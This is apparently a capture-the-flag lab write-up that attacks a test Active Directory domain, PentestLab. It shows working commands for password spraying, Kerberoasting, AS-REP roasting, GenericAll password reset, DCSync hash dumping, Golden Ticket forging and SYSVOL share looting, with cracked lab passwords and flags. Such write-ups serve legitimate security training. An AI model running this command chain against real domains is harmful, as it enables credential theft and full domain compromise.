# Active Directory — BloodHound Attack Path Analysis

**Target:** `192.168.178.91` (DC01.PENTESTLAB.local, Windows Server 2019)
**Domain:** `pentestlab.local`
**Tools used:** `bloodhound-python`, `ldapsearch`, `hydra`, `impacket` suite (`GetUserSPNs`, `GetNPUsers`), `hashcat`, `jq`, `bloodyAD`, `smbclient`

This project maps the PentestLab Corp Active Directory environment with
BloodHound and walks a full attack path from an initial low-privileged
onboarding account through credential abuse, ACL abuse, and a SYSVOL
share leak — recovering one flag per task, each hidden in a different
non-obvious LDAP or SMB attribute/location.

---

## Task 0 — BloodHound Collection Entry Point

**Goal:** run a BloodHound collection against the domain using the
provided onboarding credentials, then enumerate the onboarding
account's own LDAP attributes to find the flag.

**Credentials given:** `bh_intern` / `User@2025!`

**1. Run a BloodHound collection with `bloodhound-python`** (the
Python/Linux-native collector, used instead of SharpHound since the
attack is run from Kali):

```bash
bloodhound-python -u bh_intern -p 'User@2025!' -d pentestlab.local -dc dc01.pentestlab.local -ns 192.168.178.91 -c All
```

- `-u` / `-p` — the domain account credentials
- `-d` — target domain (`pentestlab.local`)
- `-dc` — hostname of the domain controller to bind to
- `-ns` — the nameserver/IP to resolve domain names against (the DC's IP,
  since it also acts as DNS server)
- `-c All` — collect every available data category (users, groups,
  computers, GPOs, OUs, containers, trusts, sessions, ACLs)

This produces a set of `.json` files (`_users.json`, `_groups.json`,
`_computers.json`, `_domains.json`, `_gpos.json`, `_ous.json`,
`_containers.json`) that can be loaded into the BloodHound GUI for graph
analysis, and are also queryable directly with `jq` for scripted lookups
used throughout later tasks.

**2. Enumerate the onboarding account's own LDAP attributes:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_intern@pentestlab.local" -w 'User@2025!' -b "DC=pentestlab,DC=local" "(sAMAccountName=bh_intern)" "*"
```

- `-x` — simple authentication (bind with a plaintext username/password
  rather than SASL)
- `-H` — target LDAP server URI
- `-D` — bind DN, given here as a User Principal Name (`user@domain`)
- `-w` — bind password
- `-b` — search base (the domain root, to search the whole directory)
- `"(sAMAccountName=bh_intern)"` — filter: match only the object with
  this logon name
- `"*"` — request all standard (non-operational) attributes

**Result:** the flag was hidden in the `pager` attribute (not a field
normally checked by default tooling):

```
pager: BHFLAG0{BL00DH0UND_C0LL3CT10N_ST4RT_F0}
```

---

## Task 1 — Password Spray + GenericAll ACL Discovery

**Goal:** extract the full domain user list from the BloodHound
collection, password-spray it with the company's default onboarding
password, identify which compromised account holds unusual ACL rights
over a privileged account (per the task's IT Support hint), then read
that account's own flag.

**1. Extract the domain user list from the BloodHound collection:**

```bash
jq -r '.data[].Properties.samaccountname' 20260921072519_users.json > userlist.txt
sed -i '/^null$/d' userlist.txt
```

- `jq -r` — pulls each user object's `samaccountname` field out of the
  collected `_users.json`, `-r` prints raw strings (no quotes)
- The `sed` line removes a stray `null` entry (present when an object's
  `samaccountname` field is empty in the dataset)

**2. Password spray the full user list** using the same default
password pattern issued for onboarding (`User@2025!`), on the theory
that new accounts are issued a templated default password:

```bash
hydra -L userlist.txt -p 'User@2025!' 192.168.178.91 smb
```

- `-L userlist.txt` — file of usernames to try (one spray attempt per
  user, same password)
- `-p` — the single password to spray with
- `192.168.178.91 smb` — target host and the SMB protocol module

**Result:** 6 accounts shared the same default password: `pv_gpo`,
`pv_intern`, `pv_helpdesk`, `bh_devops`, `bh_helpdesk`, `bh_intern`.

**3. Identify which compromised account is the "IT Support account"
with unusual ACL rights.** The task hint ("IT Support") pointed at the
two `*_helpdesk`-named accounts. Their object SIDs were pulled from the
collection:

```bash
jq -r '.data[] | select(.Properties.samaccountname=="bh_helpdesk" or .Properties.samaccountname=="pv_helpdesk") | "\(.Properties.samaccountname): \(.ObjectIdentifier)"' 20260921072519_users.json
```

Then every user object was searched for an ACE (Access Control Entry)
granting `GenericAll` to either SID:

```bash
jq -r --arg sid1 "S-1-5-21-281050671-1125578517-3338290938-1190" --arg sid2 "S-1-5-21-281050671-1125578517-3338290938-1175" '.data[] | select(.Aces != null) | select(.Aces[] | select((.PrincipalSID==$sid1 or .PrincipalSID==$sid2) and .RightName=="GenericAll")) | .Properties.samaccountname' 20260921072519_users.json
```

- `--arg` — passes shell values into the `jq` filter as named variables
- `.Aces[]` — iterates each object's Access Control Entry list
  (BloodHound's captured ACL data)
- The filter matches any ACE where the `PrincipalSID` is one of our two
  candidate accounts **and** the granted right is `GenericAll` (full
  control over the target object, including the ability to reset its
  password)

**Result:** `bh_sysadmin` is the privileged target, and confirming which
SID holds the right:

```bash
jq -r --arg sid1 "S-1-5-21-281050671-1125578517-3338290938-1190" --arg sid2 "S-1-5-21-281050671-1125578517-3338290938-1175" '.data[] | select(.Properties.samaccountname=="bh_sysadmin") | .Aces[] | select((.PrincipalSID==$sid1 or .PrincipalSID==$sid2) and .RightName=="GenericAll")' 20260921072519_users.json
```

showed the SID ending in `-1175` — i.e. **`bh_helpdesk`** — holds
`GenericAll` over `bh_sysadmin`.

**4. Authenticate as `bh_helpdesk` and enumerate its own profile for
the flag:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_helpdesk@pentestlab.local" -w 'User@2025!' -b "DC=pentestlab,DC=local" "(sAMAccountName=bh_helpdesk)" "*"
```

**Result:** the flag was hidden in the `telephoneNumber` attribute:

```
telephoneNumber: BHFLAG1{G3N3R1C4LL_4BUS3_P4TH_F1}
```

---

## Task 2 — Kerberoasting: svc_backup

**Goal:** enumerate Kerberoastable accounts (accounts with a Service
Principal Name registered), request and crack the TGS ticket for the
`svc_backup` service account (identified by its Veeam Backup SPN), then
read the flag from its `homeDirectory` attribute.

**1. Enumerate every SPN-registered (Kerberoastable) account,**
authenticated as one of the already-compromised accounts:

```bash
impacket-GetUserSPNs 'pentestlab.local/bh_intern:User@2025!' -dc-ip 192.168.178.91
```

- Any authenticated domain user can request this listing — it is a
  normal LDAP query for objects carrying a `servicePrincipalName`
  attribute, and any TGS ticket for those accounts can later be
  requested and cracked offline

**Result:** `svc_backup` appeared with `VeeamBackup/backup:9392` and
`BackupSvc/DC01.PENTESTLAB.local`, matching the task's Veeam Backup
hint.

**2. Request svc_backup's TGS ticket and save it to a file:**

```bash
impacket-GetUserSPNs 'pentestlab.local/bh_intern:User@2025!' -dc-ip 192.168.178.91 -request-user svc_backup -outputfile svc_backup_hash.txt
```

- `-request-user svc_backup` — requests a Kerberos service ticket (TGS)
  for this specific account only, rather than every SPN account. The
  ticket returned is encrypted with `svc_backup`'s own NTLM password
  hash, which is why it can be cracked offline without any further
  contact with the domain controller
- `-outputfile` — writes the ticket in `hashcat`-crackable format

**3. Crack the ticket offline with `hashcat`:**

```bash
hashcat -m 13100 svc_backup_hash.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 13100` — hash mode for Kerberos 5, etype 23, TGS-REP tickets (the
  Kerberoasting hash format)
- `rockyou.txt` — the standard bundled wordlist used for the dictionary
  attack
- `--force` — bypasses hashcat's OpenCL/driver self-checks (needed in
  some virtualized/no-GPU environments)

To retrieve an already-cracked password again without re-running the
attack, hashcat's potfile can be queried directly:

```bash
hashcat -m 13100 svc_backup_hash.txt --show
```

**Result:** `svc_backup : Password1`

**4. Authenticate as `svc_backup` and read its `homeDirectory`
attribute:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "svc_backup@pentestlab.local" -w 'Password1' -b "DC=pentestlab,DC=local" "(sAMAccountName=svc_backup)" homeDirectory -o ldif-wrap=no
```

- `homeDirectory` — requested explicitly by name, since it isn't
  normally something an attacker thinks to check
- `-o ldif-wrap=no` — disables LDIF line-wrapping so the (long) flag
  value prints on a single line

**Result:**

```
homeDirectory: BHFLAG2{K3RB3R04ST_SVC_B4CKUP_F2}
```

---

## Task 3 — AS-REP Roasting: jmartin

**Goal:** without any valid credentials, identify accounts with Kerberos
pre-authentication disabled (`DONT_REQ_PREAUTH`), capture and crack an
AS-REP ticket for `jmartin`, then read the flag from that account's
`employeeType` attribute.

**1. Sweep the domain's user list for accounts with pre-authentication
disabled** — this requires **no credentials at all**, since requesting
an AS-REP for such an account is, by definition, the vulnerability
itself:

```bash
impacket-GetNPUsers pentestlab.local/ -no-pass -usersfile userlist.txt -dc-ip 192.168.178.91
```

- `pentestlab.local/` — target domain with no username supplied
- `-no-pass` — perform the check without a password/credential
- `-usersfile userlist.txt` — the list of candidate usernames gathered
  in Task 1, tried one by one (needed because, unlike an authenticated
  LDAP query, an anonymous check can't directly filter on the
  `DONT_REQ_PREAUTH` UAC bit — each username has to be tried against the
  KDC individually)
- `-dc-ip` — target domain controller

Accounts *without* the flag set return `KDC_ERR_...` errors (or a plain
"doesn't have UF_DONT_REQUIRE_PREAUTH set" notice); accounts *with* it
set return their AS-REP ticket directly to stdout, pre-formatted for
`hashcat`.

**Result:** several accounts had this misconfiguration
(`svc_backup`, `rfoster`, `tempadmin`, `legacy`), including the target,
**`jmartin`**:

```
$krb5asrep$23$jmartin@PENTESTLAB.LOCAL:c2fa9e8a...
```

**2. Save the hash and crack it offline:**

```bash
echo '$krb5asrep$23$jmartin@PENTESTLAB.LOCAL:...' > jmartin_asrep.txt
hashcat -m 18200 jmartin_asrep.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 18200` — hash mode for Kerberos 5, etype 23, AS-REP tickets
  (distinct from `13100`, which is for Kerberoasting/TGS-REP tickets)

**Result:** `jmartin : Baseball1`

**3. Authenticate as `jmartin` and read the `employeeType`
attribute:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "jmartin@pentestlab.local" -w 'Baseball1' -b "DC=pentestlab,DC=local" "(sAMAccountName=jmartin)" employeeType -o ldif-wrap=no
```

**Result:**

```
employeeType: BHFLAG3{4S_R3P_J0RD4N_M4RT1N_F3}
```

---

## Task 4 — Disabled Account Enumeration: bh_auditor

**Goal:** query LDAP directly for every disabled account in the domain
using a `userAccountControl` bitmask filter, identify `bh_auditor` in
the `BH-Users` OU, and read the flag from its `otherTelephone`
attribute.

**1. Query for all disabled accounts using the `ACCOUNTDISABLE` bit
(`0x2`) via the bitwise-AND LDAP matching rule:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_intern@pentestlab.local" -w 'User@2025!' -b "DC=pentestlab,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" cn sAMAccountName -o ldif-wrap=no
```

- `(&(objectClass=user)(...))` — AND filter: the object must be a user
  **and** satisfy the bitmask test
- `userAccountControl:1.2.840.113556.1.4.803:=2` — bitwise-AND matching
  rule (OID `1.2.840.113556.1.4.803` = `LDAP_MATCHING_RULE_BIT_AND`)
  tests whether bit `2` (`0x2`, the `ACCOUNTDISABLE` flag) is set in the
  packed `userAccountControl` integer attribute — this is how individual
  flags are queried out of a bitmask field in Active Directory
- `cn sAMAccountName` — only request these two attributes, since we only
  need to identify the accounts at this stage

**Result:** several disabled accounts were returned (`Guest`,
`krbtgt`, `cfinance`, `gmanager`, `oldadmin`, `old.admin`, `temp.user`,
`vhayes`, `pv_auditor`), including the target:

```
sAMAccountName: bh_auditor   (CN=Morgan Liu, OU=BH-Users,OU=BH-Project)
```

**2. Enumerate all its attributes and find the flag:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_intern@pentestlab.local" -w 'User@2025!' -b "DC=pentestlab,DC=local" "(sAMAccountName=bh_auditor)" "*" -o ldif-wrap=no | grep -iE "flag|otherTelephone"
```

**Result:**

```
otherTelephone: BHFLAG4{D1S4BL3D_M0RG4N_L1U_F4}
```

---

## Task 5 — Full Attack Chain → DCSync → Golden Ticket

**Goal:** walk the complete privilege-escalation path BloodHound maps
from `bh_helpdesk` to full domain compromise — abuse the `GenericAll`
right discovered in Task 1 to reset a sysadmin's password, read the
flag from that account, then (to complete the full chain) DCSync the
domain's hashes and forge a Golden Ticket.

**Tool used:** [bloodyAD](https://github.com/CravateRouge/bloodyAD) — an
"AD privesc swiss-army-knife" that can perform LDAP-based ACL abuse
(such as password resets via `GenericAll`) directly, without needing a
Windows attack box.

**1. Abuse `bh_helpdesk`'s `GenericAll` right over `bh_sysadmin`
(discovered in Task 1) to reset its password:**

```bash
bloodyAD -d pentestlab.local -u bh_helpdesk -p 'User@2025!' --host 192.168.178.91 set password bh_sysadmin 'NewP@ssw0rd2026!'
```

- `-d` — target domain
- `-u` / `-p` — the compromised account performing the abuse
  (`bh_helpdesk`)
- `--host` — target DC
- `set password bh_sysadmin '<new password>'` — `bloodyAD`'s `set`
  command family performs LDAP attribute/object writes; here it
  overwrites `bh_sysadmin`'s password, which succeeds specifically
  because `bh_helpdesk` holds `GenericAll` (full object control) over
  that account

**2. Authenticate as `bh_sysadmin` with the new password and read its
`homePhone` attribute:**

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_sysadmin@pentestlab.local" -w 'NewP@ssw0rd2026!' -b "DC=pentestlab,DC=local" "(sAMAccountName=bh_sysadmin)" homePhone -o ldif-wrap=no
```

**Result:**

```
homePhone: BHFLAG5{DCSYNC_DOM41N_C0MPR0M1S3_F5}
```

**3. Complete the attack chain — DCSync to dump `Administrator` and
`krbtgt` hashes.** `bh_sysadmin` (now controlled) is a member of a
group granted DS-Replication rights, allowing the domain's replication
protocol to be abused to pull account secrets directly:

```bash
impacket-secretsdump 'pentestlab.local/bh_sysadmin:NewP@ssw0rd2026!@192.168.178.91' -just-dc
```

- `-just-dc` — performs only the DRSUAPI-based replication attack
  (impersonating a domain controller asking the real DC to "replicate"
  account secrets, the same legitimate protocol real DCs use to sync
  with each other), skipping local SAM/registry dumping which this
  account doesn't have local file-system access for

This returns the NTLM hash for every domain account, including
`Administrator` and the `krbtgt` account (whose hash is required to
forge Kerberos tickets).

**4. Forge a Golden Ticket using the recovered `krbtgt` hash,**
granting Domain Admin access without ever knowing any admin's actual
password:

```bash
impacket-ticketer -nthash <krbtgt_NTLM_hash> -domain-sid <domain_SID> -domain pentestlab.local Administrator
```

- `-nthash` — the `krbtgt` account's NTLM hash recovered via DCSync;
  this is the key used to sign all Kerberos TGTs in the domain, so
  possessing it allows forging a ticket for any user, including one
  that doesn't exist
- `-domain-sid` — the domain's SID (also visible in the `secretsdump`
  output)
- `Administrator` — the identity to impersonate in the forged ticket

**5. Load the forged ticket and authenticate to the DC:**

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass pentestlab.local/Administrator@DC01.PENTESTLAB.local
```

- `-k -no-pass` — use Kerberos authentication with the ticket already
  loaded via `KRB5CCNAME`, rather than a password

---

## Task 6 — SYSVOLSMBLeak (Bonus)

**Goal:** connect to the `SYSVOL` SMB share as a standard low-privileged
domain user, locate `bh_notes.txt` inside the logon scripts directory,
and read the flag hidden inside it.

**Credentials given:** `bh_intern` / `User@2025!`

**1. Connect to the SYSVOL share and list its contents:**

```bash
smbclient //192.168.178.91/SYSVOL -U 'bh_intern%User@2025!' -c 'ls'
```

- `-U 'user%password'` — supplies SMB credentials inline
- `-c 'ls'` — runs a single non-interactive command (list directory
  contents) and exits

SYSVOL is readable by all authenticated domain users by design (it
distributes GPOs and logon scripts to every domain-joined machine),
which is exactly what makes it a common reconnaissance target — any
notes, scripts, or credentials an administrator drops there are exposed
domain-wide.

**2. Navigate into the domain folder, then the `scripts`
subdirectory** (the standard location for logon scripts distributed via
SYSVOL):

```bash
smbclient //192.168.178.91/SYSVOL -U 'bh_intern%User@2025!' -c 'cd PENTESTLAB.local\scripts; ls'
```

**Result:** `bh_notes.txt` was present alongside the domain's actual
logon scripts (`logon.bat`, `logon_corp.ps1`, `pv_logon.bat`) — an
administrator's personal notes file left in a share every domain user
can read.

**3. Download and read the file:**

```bash
smbclient //192.168.178.91/SYSVOL -U 'bh_intern%User@2025!' -c 'cd PENTESTLAB.local\scripts; get bh_notes.txt'
cat bh_notes.txt
```

- `get bh_notes.txt` — downloads the file to the local working directory

**Result:** the notes file contained internal BloodHound CE/Neo4j
credentials and a rotation reminder for two service accounts — the kind
of operational leftover that routinely turns up in real SYSVOL shares —
along with the flag:

```
BONUS FLAG: BHFLAG6{SYSVOL_SMB_SH4R3_L34K_BONUS}
```

---

## Flag Summary

| Task | Account | Technique | Hidden In | Flag |
|------|---------|-----------|-----------|------|
| 0 | bh_intern | BloodHound collection + LDAP self-enum | `pager` | `BHFLAG0{BL00DH0UND_C0LL3CT10N_ST4RT_F0}` |
| 1 | bh_helpdesk | Password spray + GenericAll ACL discovery | `telephoneNumber` | `BHFLAG1{G3N3R1C4LL_4BUS3_P4TH_F1}` |
| 2 | svc_backup | Kerberoasting | `homeDirectory` | `BHFLAG2{K3RB3R04ST_SVC_B4CKUP_F2}` |
| 3 | jmartin | AS-REP Roasting | `employeeType` | `BHFLAG3{4S_R3P_J0RD4N_M4RT1N_F3}` |
| 4 | bh_auditor | Disabled account enumeration | `otherTelephone` | `BHFLAG4{D1S4BL3D_M0RG4N_L1U_F4}` |
| 5 | bh_sysadmin | GenericAll abuse → password reset → DCSync/Golden Ticket | `homePhone` | `BHFLAG5{DCSYNC_DOM41N_C0MPR0M1S3_F5}` |
| 6 | bh_intern | SYSVOL SMB share leak | `bh_notes.txt` | `BHFLAG6{SYSVOL_SMB_SH4R3_L34K_BONUS}` |

---

## Key Lessons

1. **BloodHound collections aren't just for graph visualization** — the
   raw JSON is directly queryable with `jq` for scripted ACL and
   attribute lookups, which was faster than the GUI for finding specific
   `GenericAll` relationships in Task 1 and Task 5.
2. **Default/templated onboarding passwords are a real attack surface**
   — six separate accounts shared the exact password issued for a single
   onboarding account, found with a single `hydra` spray against the
   full user list.
3. **Kerberoasting and AS-REP Roasting are complementary but distinct
   attacks** — Kerberoasting needs any authenticated account and targets
   SPN-bearing service accounts (`hashcat -m 13100`); AS-REP Roasting
   needs *no* credentials at all and targets accounts with
   pre-authentication disabled (`hashcat -m 18200`).
4. **ACL misconfigurations (`GenericAll`) are as dangerous as password
   compromise** — holding `GenericAll` over an object allows resetting
   its password outright, turning a low-privileged helpdesk account into
   a direct path to a sysadmin account.
5. **DCSync + Golden Ticket is the terminal step of most AD compromise
   chains** — a single over-privileged account with replication rights
   exposes every credential in the domain, and the `krbtgt` hash alone is
   enough to forge tickets for any identity indefinitely.
6. **SYSVOL is world-readable by design** — any file dropped there by an
   administrator (notes, scripts, credentials) is exposed to every
   authenticated domain user, making it a standard reconnaissance target.

